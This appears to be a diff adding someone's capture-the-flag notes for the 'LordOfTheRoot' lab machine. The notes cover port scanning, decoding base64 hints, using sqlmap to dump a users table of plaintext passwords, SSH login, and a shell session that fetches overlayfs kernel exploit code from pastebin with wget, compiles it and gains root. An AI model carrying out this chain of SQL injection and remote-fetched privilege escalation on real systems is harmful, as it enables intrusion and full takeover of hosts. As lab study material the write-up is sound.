@@ -1,0 +1,126 @@
+LordOfTheRoot
+time taken: ~3 1/2 hours
+
+nmap:
+tarting Nmap 7.40 ( https://nmap.org ) at 2017-07-02 22:28 MDT
+Warning: 212.129.29.185 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf03.root-me.org (212.129.29.185)
+Host is up (0.096s latency).
+Not shown: 1991 closed ports
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
+|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
+25/tcp   filtered smtp
+135/tcp  filtered msrpc
+136/tcp  filtered profile
+137/tcp  filtered netbios-ns
+138/tcp  filtered netbios-dgm
+139/tcp  filtered netbios-ssn
+445/tcp  filtered microsoft-ds
+1337/tcp open     http         Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Aggressive OS guesses: QEMU user mode network gateway (95%), Konica Minolta 7035 printer (87%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (87%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Allied Telesyn AT-9006SX/SC switch (86%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (86%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.13 ms 10.0.2.2
+2   0.21 ms ctf03.root-me.org (212.129.29.185)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.58 seconds
+
+
+nothing with uniscan
+
+every 404 page leads to an image, inspect source to find base64 string:
+
+THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh -->
+Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! -->
+/978345210/index.php
+
+yay
+
+login screen
+
+can't manually get page to barf back error, use tamper data to see post params and then sqlmap this shit
+
+[17:01:23] [INFO] POST parameter 'username' appears to be 'Oracle AND time-based blind' injectable 
+it looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+this turned out to be a false positive, or so it seems
+
+sqlmap doesn't seem to be too reliable for this lab? sometimes a form param is injectable, sometimes it isn't.
+
+eventually, the follwoing passwords were reached:
+
+Database: Webapp
+Table: Users
+[5 entries]
++----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+
+only smeagol seems to work for ssh
+
+this looks promising...
+
+smeagol@LordOfTheRoot:/SECRET$ ls -R
+.:
+door1  door2  door3
+
+./door1:
+file
+
+./door2:
+file
+
+./door3:
+file
+
+looks like some sort of buffer overflow style challenge
+
+but maybe there is a fastr way...
+
+smeagol@LordOfTheRoot:/SECRET$ uname -r
+3.19.0-25-generic
+
+may be vulnerable to 
+
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Privilege Escalation
+(https://www.exploit-db.com/exploits/39166/)
+
+smeagol@LordOfTheRoot:/tmp$ wget https://pastebin.com/raw/61LnbVzE --no-check-certificate
+--2017-07-06 17:32:35--  https://pastebin.com/raw/61LnbVzE
+Resolving pastebin.com (pastebin.com)... 104.20.208.21, 104.20.209.21
+Connecting to pastebin.com (pastebin.com)|104.20.208.21|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+Saving to: ‘61LnbVzE’
+
+    [ <=>                                   ] 2,789       --.-K/s   in 0s      
+
+2017-07-06 17:32:35 (35.0 MB/s) - ‘61LnbVzE’ saved [2789]
+
+smeagol@LordOfTheRoot:/tmp$ mv 61LnbVzE exp.c
+smeagol@LordOfTheRoot:/tmp$ sed -i -e '$a\' exp.c
+smeagol@LordOfTheRoot:/tmp$ gcc -o exp exp.c
+smeagol@LordOfTheRoot:/tmp$ ./exp
+root@LordOfTheRoot:/tmp# id
+uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
+root@LordOfTheRoot:/tmp# 
+
+would be interesting to see how /SECRET could be used to get root too.
+
